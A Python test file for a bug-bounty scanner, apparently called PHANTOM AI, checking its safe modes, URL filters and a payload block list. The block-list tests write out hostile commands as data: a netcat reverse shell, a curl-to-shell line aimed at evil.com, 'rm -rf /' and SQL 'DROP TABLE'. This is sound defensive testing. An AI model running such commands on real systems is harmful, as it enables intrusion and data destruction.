#!/usr/bin/env python3
"""
PHANTOM AI Safety Verification Test
====================================

This test verifies that all safety layers are working correctly:
1. Environment variable PHANTOM_SAFE_MODE is respected
2. SafeAsyncClient blocks dangerous methods in safe mode
3. Destructive payloads are blocked
4. Custom headers are injected correctly
5. Static asset filtering works

Run with: python -m pytest tests/test_safety_verification.py -v
"""

import asyncio
import json
import os
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest


class TestSafetyLayers:
    """Test all safety layers of PHANTOM AI."""

    def setup_method(self):
        """Reset environment before each test."""
        # Clear any existing safety settings
        for var in ["PHANTOM_SAFE_MODE", "PHANTOM_ALLOW_AGGRESSIVE", "PHANTOM_CUSTOM_HEADERS"]:
            if var in os.environ:
                del os.environ[var]

    def test_safe_mode_environment_variable(self):
        """Test that PHANTOM_SAFE_MODE defaults to 'safe'."""
        from utils.safe_http_client import get_safety_mode

        # Default should be safe
        assert get_safety_mode() == "safe", "Default safety mode should be 'safe'"

        # Test setting different modes
        os.environ["PHANTOM_SAFE_MODE"] = "cautious"
        assert get_safety_mode() == "cautious"

        os.environ["PHANTOM_SAFE_MODE"] = "passive"
        assert get_safety_mode() == "passive"

    def test_aggressive_mode_blocked_without_auth(self):
        """Test that aggressive mode requires explicit authorization."""
        from utils.safe_http_client import get_safety_mode

        # Set aggressive without authorization
        os.environ["PHANTOM_SAFE_MODE"] = "aggressive"

        # Should fall back to standard
        mode = get_safety_mode()
        assert mode == "standard", f"Aggressive without auth should fall back to standard, got: {mode}"

    def test_aggressive_mode_allowed_with_auth(self):
        """Test that aggressive mode works with explicit authorization."""
        # Need to reimport to pick up new env var
        os.environ["PHANTOM_ALLOW_AGGRESSIVE"] = "authorized"

        # Reimport to get fresh _AGGRESSIVE_EXPLICITLY_ALLOWED
        import importlib
        import utils.safe_http_client as shc
        importlib.reload(shc)

        os.environ["PHANTOM_SAFE_MODE"] = "aggressive"
        mode = shc.get_safety_mode()
        assert mode == "aggressive", f"Aggressive with auth should work, got: {mode}"

    def test_custom_headers_parsing(self):
        """Test custom headers are parsed correctly from environment."""
        from utils.safe_http_client import get_custom_headers

        # No headers set
        assert get_custom_headers() == {}

        # Valid JSON headers
        os.environ["PHANTOM_CUSTOM_HEADERS"] = json.dumps({
            "X-Bug-Bounty": "testuser-hackerone",
            "Authorization": "Bearer test123"
        })
        headers = get_custom_headers()
        assert headers["X-Bug-Bounty"] == "testuser-hackerone"
        assert headers["Authorization"] == "Bearer test123"

        # Invalid JSON should return empty dict
        os.environ["PHANTOM_CUSTOM_HEADERS"] = "not valid json"
        assert get_custom_headers() == {}

    def test_is_payload_safe_blocks_destructive(self):
        """Test that destructive payloads are blocked."""
        from utils.safe_http_client import is_payload_safe

        # Safe payloads
        assert is_payload_safe("SELECT * FROM users") is True
        assert is_payload_safe("id=1") is True
        assert is_payload_safe("{{7*7}}") is True

        # Destructive payloads - MUST be blocked
        assert is_payload_safe("DROP TABLE users") is False
        assert is_payload_safe("DROP DATABASE test") is False
        assert is_payload_safe("TRUNCATE TABLE users") is False
        assert is_payload_safe("rm -rf /") is False
        assert is_payload_safe("shutdown") is False
        assert is_payload_safe("nc -e /bin/sh") is False
        assert is_payload_safe("curl http://evil.com | sh") is False

    def test_is_url_safe_blocks_dangerous_endpoints(self):
        """Test that dangerous URL patterns are blocked."""
        from utils.safe_http_client import is_url_safe

        # Safe URLs
        is_safe, reason = is_url_safe("https://api.example.com/users")
        assert is_safe is True

        is_safe, reason = is_url_safe("https://api.example.com/profile")
        assert is_safe is True

        # Dangerous URLs - MUST be blocked
        is_safe, reason = is_url_safe("https://api.example.com/delete-all")
        assert is_safe is False, f"delete-all should be blocked: {reason}"

        is_safe, reason = is_url_safe("https://api.example.com/admin/purge")
        assert is_safe is False, f"admin/purge should be blocked: {reason}"

        is_safe, reason = is_url_safe("https://api.example.com/destroy")
        assert is_safe is False, f"destroy should be blocked: {reason}"

    @pytest.mark.asyncio
    async def test_safe_async_client_blocks_post_in_safe_mode(self):
        """Test that SafeAsyncClient blocks POST in safe mode."""
        os.environ["PHANTOM_SAFE_MODE"] = "safe"

        # Reimport to get fresh settings
        import importlib
        import utils.safe_http_client as shc
        importlib.reload(shc)

        async with shc.SafeAsyncClient(verify=False) as client:
            # GET should work
            response = await client.get("https://httpbin.org/get")
            assert response.status_code in [200, 403]  # 403 if blocked, 200 if allowed

            # POST should be blocked in safe mode
            response = await client.post("https://httpbin.org/post", json={"test": "data"})
            # Should return 403 (blocked by SafeAsyncClient)
            assert response.status_code == 403, f"POST should be blocked in safe mode, got: {response.status_code}"
            assert b"Blocked by SafeAsyncClient" in response.content

    @pytest.mark.asyncio
    async def test_safe_async_client_blocks_destructive_payloads(self):
        """Test that SafeAsyncClient blocks destructive payloads even with allowed method."""
        os.environ["PHANTOM_SAFE_MODE"] = "standard"  # Standard allows POST

        import importlib
        import utils.safe_http_client as shc
        importlib.reload(shc)

        async with shc.SafeAsyncClient(verify=False) as client:
            # POST with destructive payload should be blocked
            response = await client.post(
                "https://httpbin.org/post",
                json={"query": "DROP TABLE users"}
            )
            assert response.status_code == 403, "Destructive payload should be blocked"
            assert b"Blocked" in response.content


class TestStaticAssetFiltering:
    """Test static asset filtering to prevent false positives."""

    def test_static_asset_detection_in_ssti_scanner(self):
        """Test that SSTI scanner correctly identifies static assets."""
        from scanning.modules.ssti_scanner import is_static_asset_url

        # Static assets - should be skipped
        assert is_static_asset_url("https://example.com/image.jpg") is True
        assert is_static_asset_url("https://example.com/style.css") is True
        assert is_static_asset_url("https://example.com/app.js") is True
        assert is_static_asset_url("https://example.com/logo.svg") is True
        assert is_static_asset_url("https://example.com/font.woff2") is True
        assert is_static_asset_url("https://example.com/static/bundle.js") is True
        assert is_static_asset_url("https://example.com/assets/image.png") is True
        assert is_static_asset_url("https://example.com/_next/static/chunk.js") is True

        # Dynamic URLs - should be tested
        assert is_static_asset_url("https://example.com/api/users") is False
        assert is_static_asset_url("https://example.com/page?id=1") is False
        assert is_static_asset_url("https://example.com/template") is False
        assert is_static_asset_url("https://example.com/render") is False

    def test_static_asset_detection_in_validation_pipeline(self):
        """Test that validation pipeline correctly identifies static assets."""
        from phantom.validation_pipeline import is_static_asset_url, VULN_TYPES_IMPOSSIBLE_ON_STATIC

        # Verify the same static assets are detected
        assert is_static_asset_url("https://example.com/image.jpg") is True
        assert is_static_asset_url("https://example.com/api/users") is False

        # Verify SSTI is in impossible vuln types
        assert "ssti" in VULN_TYPES_IMPOSSIBLE_ON_STATIC
        assert "sqli" in VULN_TYPES_IMPOSSIBLE_ON_STATIC


class TestBountyCommandSafety:
    """Test bounty command specific safety features."""

    def test_bounty_uses_safe_mode(self):
        """Verify bounty command forces safe mode."""
        # This is a static analysis test - bounty command should always use safe_mode="safe"
        from pathlib import Path
        import re

        cli_path = Path(__file__).parent.parent / "cli" / "phantom_cli.py"
        cli_content = cli_path.read_text()

        # Find the _run_bounty_scan call in the bounty function
        # It should pass safe_mode="safe"
        pattern = r'await _run_phantom_scan\([^)]*safe_mode="safe"'
        assert re.search(pattern, cli_content), "Bounty command should use safe_mode='safe'"

    def test_custom_headers_in_bounty(self):
        """Verify bounty command supports custom headers."""
        from pathlib import Path

        cli_path = Path(__file__).parent.parent / "cli" / "phantom_cli.py"
        cli_content = cli_path.read_text()

        # Check for --header and --username options
        assert '--header' in cli_content or '-H' in cli_content, "Bounty should support --header option"
        assert '--username' in cli_content or '-u' in cli_content, "Bounty should support --username option"
        assert 'X-Bug-Bounty' in cli_content, "Bounty should generate X-Bug-Bounty header"


class TestGlobalSafetyActivation:
    """Test that global safety is activated correctly."""

    def test_full_scanner_activates_global_safety(self):
        """Verify that importing full_scanner activates global safety."""
        import httpx

        # Before importing full_scanner, AsyncClient should be original
        original_class = httpx.AsyncClient

        # Import full_scanner - this should replace httpx.AsyncClient
        from scanning.full_scanner import FullScanner

        # After import, check if it's been replaced
        from utils.safe_http_client import SafeAsyncClient

        # The httpx.AsyncClient should now be SafeAsyncClient
        assert httpx.AsyncClient is SafeAsyncClient, \
            "httpx.AsyncClient should be replaced with SafeAsyncClient after importing full_scanner"


def run_quick_safety_check():
    """Quick safety check that can be run before scanning."""
    print("=" * 60)
    print("PHANTOM AI SAFETY VERIFICATION")
    print("=" * 60)

    errors = []

    # Check 1: Safety mode
    from utils.safe_http_client import get_safety_mode
    mode = get_safety_mode()
    if mode in ("passive", "safe", "cautious"):
        print(f"[PASS] Safety mode: {mode}")
    else:
        print(f"[WARN] Safety mode: {mode} (consider using 'safe' for bug bounty)")

    # Check 2: Aggressive blocked
    os.environ["PHANTOM_SAFE_MODE"] = "aggressive"
    if "PHANTOM_ALLOW_AGGRESSIVE" not in os.environ:
        mode = get_safety_mode()
        if mode != "aggressive":
            print(f"[PASS] Aggressive mode blocked without authorization (fallback: {mode})")
        else:
            errors.append("Aggressive mode NOT blocked!")
            print("[FAIL] Aggressive mode should be blocked without authorization")

    # Check 3: Destructive payloads blocked
    from utils.safe_http_client import is_payload_safe
    dangerous = ["DROP TABLE", "rm -rf /", "nc -e /bin/sh"]
    all_blocked = all(not is_payload_safe(p) for p in dangerous)
    if all_blocked:
        print("[PASS] Destructive payloads blocked")
    else:
        errors.append("Some destructive payloads not blocked!")
        print("[FAIL] Destructive payloads should be blocked")

    # Check 4: Global safety enabled
    from scanning.full_scanner import FullScanner  # This activates global safety
    import httpx
    from utils.safe_http_client import SafeAsyncClient
    if httpx.AsyncClient is SafeAsyncClient:
        print("[PASS] Global HTTP safety enabled")
    else:
        errors.append("Global HTTP safety not enabled!")
        print("[FAIL] Global HTTP safety should be enabled")

    # Check 5: Static asset filtering
    from scanning.modules.ssti_scanner import is_static_asset_url
    if is_static_asset_url("https://example.com/image.jpg"):
        print("[PASS] Static asset filtering active")
    else:
        errors.append("Static asset filtering not working!")
        print("[FAIL] Static asset filtering should be active")

    print("=" * 60)
    if errors:
        print(f"RESULT: {len(errors)} SAFETY ISSUES FOUND")
        for e in errors:
            print(f"  - {e}")
        return False
    else:
        print("RESULT: ALL SAFETY CHECKS PASSED")
        print("The bounty command is SAFE to use on HackerOne/Bugcrowd")
        return True


if __name__ == "__main__":
    success = run_quick_safety_check()
    sys.exit(0 if success else 1)
